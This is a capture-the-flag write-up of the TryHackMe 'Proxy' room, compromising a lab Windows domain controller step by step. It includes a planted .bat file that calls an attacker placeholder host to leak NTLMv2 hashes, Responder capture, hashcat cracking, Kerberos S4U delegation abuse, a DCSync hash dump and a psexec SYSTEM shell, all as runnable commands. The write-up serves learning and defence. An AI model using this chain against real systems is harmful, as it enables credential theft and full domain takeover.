# TryHackMe — Proxy (Active Directory)

## Overview

| Detail | Value |
|---|---|
| Platform | TryHackMe |
| Room | Proxy |
| Difficulty | Hard |
| OS | Windows Server 2019 |
| Techniques | SMB Enumeration, Forced Authentication (.bat), NTLMv2 Cracking, Kerberos Constrained Delegation (S4U), DCSync |

**Attack Chain:** Guest SMB Access → Writable Share → .bat Forced Auth → NTLMv2 Capture → Hashcat → Constrained Delegation (S4U2Self/S4U2Proxy) → Domain Admin → SYSTEM

---

## Reconnaissance

### Nmap

```bash
nmap -sC -sV -O -A -p- <TARGET_IP>
```

Key findings from the full port scan:

- **53/tcp** — DNS
- **88/tcp** — Kerberos (Microsoft Windows)
- **135/tcp** — MSRPC
- **139/tcp** — NetBIOS
- **389/tcp** — LDAP (Domain: ctf.local)
- **445/tcp** — SMB (signing: **enabled and required**)
- **636/tcp** — LDAPS (tcpwrapped)
- **3268/tcp** — Global Catalog
- **3389/tcp** — RDP

RDP NTLM info disclosure confirmed the target identity:

- **Computer:** DC01
- **Domain:** ctf.local
- **FQDN:** DC01.ctf.local
- **Build:** 10.0.17763 (Windows Server 2019)
- **SMB Signing:** Enabled and Required

This is a standalone Domain Controller — the full DC port signature (DNS + Kerberos + LDAP + GC + kpasswd) confirms it.

### DNS

```bash
dig axfr ctf.local @<TARGET_IP>
dig SRV _ldap._tcp.ctf.local @<TARGET_IP>
```

Zone transfer failed. SRV records confirmed DC01 is the only host in the domain.

---

## Enumeration

### SMB — Null & Guest Sessions

```bash
netexec smb <TARGET_IP> -u '' -p '' --shares        # Null — auth succeeds, shares denied
netexec smb <TARGET_IP> -u 'guest' -p '' --shares    # Guest — shares enumerated
```

Guest session revealed a critical share:

| Share | Permissions | Note |
|---|---|---|
| IT-Shared | **READ, WRITE** | IT Department Shared Resources |
| IPC$ | READ | — |
| ADMIN$, C$, NETLOGON, SYSVOL | — | No access |

### LDAP & RPC

Anonymous LDAP bind and RPC null session both returned `ACCESS_DENIED` for domain queries. The rootDSE was accessible and confirmed domain/forest functional level 7 (Server 2016).

### Loot from IT-Shared

```bash
smbclient //TARGET/IT-Shared -U 'guest%' -c 'recurse ON; prompt OFF; mget *'
```

Three files were recovered:

**IT-Credentials-Backup.txt:**
```
helpdesk.bob  :  [REDACTED]    [DISABLED - left company 2021]
it.admin      :  [REDACTED]    [DISABLED - role change 2022]
```

**IT-Onboarding-Checklist.txt:**
```
File Scanner (svc.scanner)
    Runs every 2 minutes. Enumerates IT-Shared for new files to process.
    Uses Shell enumeration to inspect file metadata and icons.

Database Backup (svc.mssql)
    Handles nightly MSSQL backups. Member of Backup Operators.
```

**IT-Portal.html:**
An internal dashboard logged in as `svc.scanner`, referencing additional hostnames (SRV01, SRV02) and usernames from ticket assignments (`j.smith`, `m.jones`, `svc.helpdesk`).

### User Validation

Password spraying with discovered credentials confirmed account status:

| Account | Status | Evidence |
|---|---|---|
| administrator | **Active** | LOGON_FAILURE (wrong password) |
| svc.scanner | **Active** | LOGON_FAILURE (wrong password) |
| svc.mssql | **Active** | LOGON_FAILURE (wrong password) |
| helpdesk.bob | Disabled | Known password, maps to Guest |
| it.admin | Disabled | Known password, maps to Guest |
| svc.helpdesk, j.smith, m.jones | Non-existent | Any password maps to Guest |

AS-REP Roasting returned no results — all active accounts require pre-authentication.

---

## Initial Access — Forced Authentication via .bat

### The Problem

The onboarding checklist described svc.scanner as using "Shell enumeration to inspect file metadata and icons." Initial attempts focused on SCF, URL, LNK, desktop.ini, and library-ms files — all standard forced authentication vectors that trigger icon resolution via Windows Explorer Shell.

**None of them worked.**

After extensive testing (including PetitPotam to confirm outbound SMB was not blocked), the breakthrough came from recognizing that svc.scanner doesn't browse the share with Explorer — it **executes scripts** found on the share.

### The Solution

A `.bat` file containing a UNC path triggers SMB authentication when executed:

```bash
cat > '@scan.bat' << 'EOF'
@echo off
dir \\<ATTACKER_IP>\share
EOF

smbclient //<TARGET_IP>/IT-Shared -U 'guest%' -c 'put @scan.bat'
```

With Responder listening:

```bash
responder -I ens5 -v
```

Within 2 minutes, svc.scanner executed the .bat file and Responder captured the NTLMv2 hash:

```
[SMB] NTLMv2-SSP Username : CTF\svc.scanner
[SMB] NTLMv2-SSP Hash     : svc.scanner::CTF:e6581e06eb735223:1F5324E9...
```

### Cracking

```bash
hashcat -m 5600 svc_hash.txt /usr/share/wordlists/rockyou.txt
```

Result: `svc.scanner:[REDACTED]`

---

## Privilege Escalation — Constrained Delegation (S4U)

### AD Enumeration with Valid Credentials

With svc.scanner credentials, full LDAP enumeration became possible:

```bash
ldapsearch -x -H ldap://<TARGET_IP> -D "svc.scanner@ctf.local" -w '[REDACTED]' \
  -b "DC=ctf,DC=local" "(userAccountControl:1.2.840.113556.1.4.803:=16777216)" \
  sAMAccountName servicePrincipalName msDS-AllowedToDelegateTo
```

Critical findings for svc.scanner:

| Attribute | Value |
|---|---|
| userAccountControl | 16843264 (NORMAL + DONT_EXPIRE + **TRUSTED_TO_AUTH_FOR_DELEGATION**) |
| servicePrincipalName | scanner/DC01, scanner/DC01.ctf.local |
| msDS-AllowedToDelegateTo | **cifs/DC01**, **cifs/DC01.ctf.local** |

The `TrustedToAuthForDelegation` flag combined with constrained delegation to `cifs/DC01` means svc.scanner can **impersonate any domain user** (including Administrator) for file system access on DC01.

### Kerberoasting (Bonus)

```bash
GetUserSPNs.py 'ctf.local/svc.scanner:[REDACTED]' -dc-ip <TARGET_IP> -request
```

Two Kerberoastable accounts were found:

| Account | SPN | Group Membership |
|---|---|---|
| svc.scanner | scanner/DC01 | — |
| svc.mssql | MSSQLSvc/DC01:1433 | Backup Operators |

### S4U2Self + S4U2Proxy Attack

**Step 1 — Obtain a TGS impersonating Administrator for CIFS on DC01:**

```bash
getST.py 'ctf.local/svc.scanner:[REDACTED]' \
  -spn cifs/DC01.ctf.local \
  -impersonate Administrator \
  -dc-ip <TARGET_IP>
```

The tool performs two Kerberos requests:
1. **S4U2Self** — requests a ticket as if Administrator is authenticating to svc.scanner
2. **S4U2Proxy** — forwards that ticket to obtain a TGS for cifs/DC01.ctf.local

Output: `Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache`

**Step 2 — Export the ticket:**

```bash
export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
```

**Step 3 — DCSync (dump all domain hashes):**

```bash
secretsdump.py -k -no-pass DC01.ctf.local
```

This uses the DRSUAPI method (Directory Replication Service) to extract the full NTDS.DIT database, yielding NT hashes for all domain accounts:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
svc.scanner:1111:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
svc.mssql:1112:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
helpdesk.bob:1113:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
it.admin:1114:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
DC01$:1008:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
```

**Step 4 — SYSTEM shell:**

```bash
psexec.py -k -no-pass DC01.ctf.local
```

```
C:\Windows\system32> whoami
nt authority\system
```

### Flag

```
C:\Users\Administrator\Desktop\flag.txt
THM{[REDACTED]}
```

---

## Lessons Learned & Anti-Patterns

### What Didn't Work (and Why)

1. **SCF / URL / LNK / desktop.ini files** — svc.scanner does not use Windows Explorer to browse the share. It programmatically processes files, so icon-based forced authentication never triggers. This consumed the most time during the engagement.

2. **PetitPotam + ntlmrelayx (SMB→LDAP relay)** — PetitPotam successfully coerced DC01$ to authenticate, but relay to LDAP silently failed. The machine account was authenticating to itself, and post-CVE-2019-1040 protections block self-relay. Additionally, cross-protocol SMB→LDAP relay has MIC (Message Integrity Code) issues on patched systems.

3. **WebDAV bypass (`\\IP@80\...`)** — Windows Server 2019 does not have the WebClient service installed by default. WebDAV-based forced authentication only works on workstation SKUs.

4. **AS-REP Roasting** — all active accounts had Kerberos pre-authentication enabled.

5. **Password spraying** — no active accounts used the discovered archived passwords.

### Key Takeaways

- **File format matters more than technique.** Understanding *how* the target processes files is critical. The description said "Shell enumeration" which was misleading — the actual behavior was script execution.

- **Room name is a hint.** "Proxy" refers to S4U2Proxy (Kerberos constrained delegation), not NTLM relay proxy.

- **Constrained delegation with protocol transition** (`TrustedToAuthForDelegation`) is a critical AD misconfiguration. It allows a service account to impersonate any user to any service listed in `msDS-AllowedToDelegateTo` without knowing the target user's password.

- **Always enumerate delegation** early when you have valid domain credentials. It's one of the most direct paths to Domain Admin.

---

## Tools Used

| Tool | Purpose |
|---|---|
| nmap | Port scanning and service enumeration |
| netexec / crackmapexec | SMB/LDAP enumeration, password spraying, module execution |
| smbclient | Share access and file operations |
| Responder | NTLMv2 hash capture |
| hashcat | Offline NTLMv2 hash cracking (mode 5600) |
| kerbrute | Kerberos user enumeration |
| ldapsearch | LDAP queries for delegation and SPN attributes |
| impacket-GetNPUsers | AS-REP Roasting |
| impacket-GetUserSPNs | Kerberoasting |
| impacket-getST | S4U2Self/S4U2Proxy ticket impersonation |
| impacket-secretsdump | DCSync / NTDS.DIT extraction via DRSUAPI |
| impacket-psexec | Remote command execution as SYSTEM |
| PetitPotam | MS-EFSRPC authentication coercion (used for testing) |
| bloodhound-python | AD relationship data collection |
